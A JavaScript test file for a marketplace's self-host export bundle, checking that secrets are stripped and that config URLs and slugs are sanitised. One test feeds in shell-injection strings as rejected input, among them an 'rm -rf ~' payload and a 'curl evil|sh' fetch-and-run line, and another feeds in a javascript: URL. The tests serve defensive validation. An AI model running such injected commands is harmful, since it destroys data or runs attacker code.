import {
  buildExportEntries,
  buildSelfHostConfigJson,
  stripSecrets,
} from "@/utils/self-host/export-bundle";
import { DEFAULT_UPSTREAM_REPO } from "@/utils/self-host/config";

const PUBKEY = "a".repeat(64);

describe("stripSecrets", () => {
  it("drops secret-looking keys at any depth", () => {
    const input = {
      name: "My Farm",
      apiKey: "sk_live_should_not_leak",
      nested: {
        token: "leak",
        color: "#fff",
        deeper: { client_secret: "leak", label: "ok" },
      },
      list: [{ password: "leak", visible: "ok" }],
    };
    const out = stripSecrets(input) as Record<string, any>;
    expect(out.name).toBe("My Farm");
    expect(out.apiKey).toBeUndefined();
    expect(out.nested.token).toBeUndefined();
    expect(out.nested.color).toBe("#fff");
    expect(out.nested.deeper.client_secret).toBeUndefined();
    expect(out.nested.deeper.label).toBe("ok");
    expect(out.list[0].password).toBeUndefined();
    expect(out.list[0].visible).toBe("ok");
  });

  it("matches the documented credential synonyms", () => {
    const input = {
      secret: 1,
      passwd: 1,
      api_key: 1,
      apikey: 1,
      bearer: 1,
      authorization: 1,
      nsec: 1,
      private_key: 1,
      privkey: 1,
      seed: 1,
      mnemonic: 1,
      credential: 1,
      access_key: 1,
      keep: 1,
    };
    const out = stripSecrets(input) as Record<string, unknown>;
    expect(Object.keys(out)).toEqual(["keep"]);
  });
});

describe("buildSelfHostConfigJson", () => {
  it("sanitizes urls and slug and never emits a true ownStripe", () => {
    const cfg = buildSelfHostConfigJson({
      pubkey: PUBKEY,
      slug: "my-farm",
      relays: ["wss://relay.example", "ftp://nope", 5, ""],
      blossomServers: ["https://blossom.example", "javascript:alert(1)"],
    });
    expect(cfg.pubkey).toBe(PUBKEY);
    expect(cfg.slug).toBe("my-farm");
    expect(cfg.relays).toEqual(["wss://relay.example"]);
    expect(cfg.blossomServers).toEqual(["https://blossom.example"]);
    // Seller must add their own key + flip the flag; never auto-on in the bundle.
    expect(cfg.ownStripe).toBe(false);
    expect(cfg.upstreamRepo).toBe(DEFAULT_UPSTREAM_REPO);
  });

  it("keeps a valid custom upstream repo URL", () => {
    expect(
      buildSelfHostConfigJson({
        pubkey: PUBKEY,
        upstreamRepo: "https://github.com/acme/milk-market",
      }).upstreamRepo
    ).toBe("https://github.com/acme/milk-market");
    expect(
      buildSelfHostConfigJson({
        pubkey: PUBKEY,
        upstreamRepo: "git@github.com:acme/milk-market.git",
      }).upstreamRepo
    ).toBe("git@github.com:acme/milk-market.git");
  });

  it("falls back to the default repo for a shell-injection upstream value", () => {
    for (const bad of [
      'https://x"; rm -rf ~ #',
      "https://x $(whoami)",
      "https://x`id`",
      "https://x;curl evil|sh",
      "ftp://nope/repo",
      "not a url",
    ]) {
      expect(
        buildSelfHostConfigJson({ pubkey: PUBKEY, upstreamRepo: bad })
          .upstreamRepo
      ).toBe(DEFAULT_UPSTREAM_REPO);
    }
  });

  it("rejects an invalid slug (fails closed to null)", () => {
    expect(
      buildSelfHostConfigJson({ pubkey: PUBKEY, slug: "bad slug!" }).slug
    ).toBeNull();
    expect(
      buildSelfHostConfigJson({ pubkey: PUBKEY, slug: "" }).slug
    ).toBeNull();
  });

  it("includes a sanitized branding snapshot when provided", () => {
    const cfg = buildSelfHostConfigJson({
      pubkey: PUBKEY,
      branding: { primaryColor: "#abc", apiKey: "leak" },
    });
    expect(cfg.branding).toEqual({ primaryColor: "#abc" });
  });
});

describe("buildExportEntries", () => {
  const entries = buildExportEntries({
    pubkey: PUBKEY,
    slug: "my-farm",
    relays: ["wss://relay.example"],
    blossomServers: ["https://blossom.example"],
    branding: { primaryColor: "#abc", secretToken: "leak" },
    generatedAt: "2026-01-01T00:00:00.000Z",
  });
  const byName = Object.fromEntries(
    entries.map((e) => [e.name, String(e.data)])
  );

  it("emits exactly the expected file set", () => {
    expect(entries.map((e) => e.name).sort()).toEqual(
      [
        ".env.example",
        "README.md",
        "SETUP.md",
        "manifest.json",
        "milk-market.config.json",
        "setup.sh",
      ].sort()
    );
  });

  it("ships an .env.example with placeholders and NO real secret values", () => {
    const env = byName[".env.example"]!;
    // Secret slots are present but EMPTY.
    expect(env).toMatch(/^STRIPE_SECRET_KEY=$/m);
    expect(env).toMatch(/^SENDGRID_API_KEY=$/m);
    // Every other secret/self-generated slot is present and EMPTY too.
    expect(env).toMatch(/^NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=$/m);
    expect(env).toMatch(/^STRIPE_WEBHOOK_SECRET=$/m);
    expect(env).toMatch(/^ENCRYPTION_NSEC=$/m);
    expect(env).toMatch(/^EMAIL_FLOW_CLICK_SECRET=$/m);
    expect(env).toMatch(/^FLOW_PROCESSOR_SECRET=$/m);
    expect(env).toMatch(/^MCP_ENCRYPTION_KEY=$/m);
    // Pre-fills the public, non-secret config.
    expect(env).toContain(`MM_SELF_HOST_PUBKEY=${PUBKEY}`);
    expect(env).toContain("MM_SELF_HOST_SLUG=my-farm");
    // NEXT_PUBLIC_BASE_URL is required; it ships with a non-secret placeholder host.
    expect(env).toMatch(/^NEXT_PUBLIC_BASE_URL=https:\/\//m);
  });

  it("documents the required setup vars and the own-policy guidance in the guide", () => {
    const readme = byName["README.md"]!;
    const setup = byName["SETUP.md"]!;
    // Setup guide enumerates the required + self-generated vars.
    expect(setup).toContain("NEXT_PUBLIC_BASE_URL");
    expect(setup).toContain("ENCRYPTION_NSEC");
    // Sellers are told to publish their OWN policies via the page builder, since
    // the platform legal pages are hidden on self-host.
    expect(readme.toLowerCase()).toContain("page builder");
    expect(setup.toLowerCase().replace(/\s+/g, " ")).toContain("page builder");
    expect(readme.toLowerCase()).toContain("terms");
  });

  it("never leaks a secret-looking value anywhere in the bundle", () => {
    const all = entries.map((e) => String(e.data)).join("\n");
    expect(all).not.toContain("leak");
    // The placeholder example string in .env (sk_test/ sk_live) must not appear.
    expect(all).not.toMatch(/sk_(live|test)_/);
  });

  it("config json carries only public fields + sanitized branding", () => {
    const parsed = JSON.parse(byName["milk-market.config.json"]!);
    expect(parsed.pubkey).toBe(PUBKEY);
    expect(parsed.slug).toBe("my-farm");
    expect(parsed.ownStripe).toBe(false);
    expect(parsed.branding).toEqual({ primaryColor: "#abc" });
    expect(JSON.stringify(parsed)).not.toContain("leak");
  });

  it("manifest documents the no-secrets guarantee", () => {
    const manifest = JSON.parse(byName["manifest.json"]!);
    expect(manifest.bundle).toBe("milk-market-self-host");
    expect(manifest.pubkey).toBe(PUBKEY);
    expect(manifest.generatedAt).toBe("2026-01-01T00:00:00.000Z");
    expect(String(manifest.note).toLowerCase()).toContain("no secrets");
  });
});
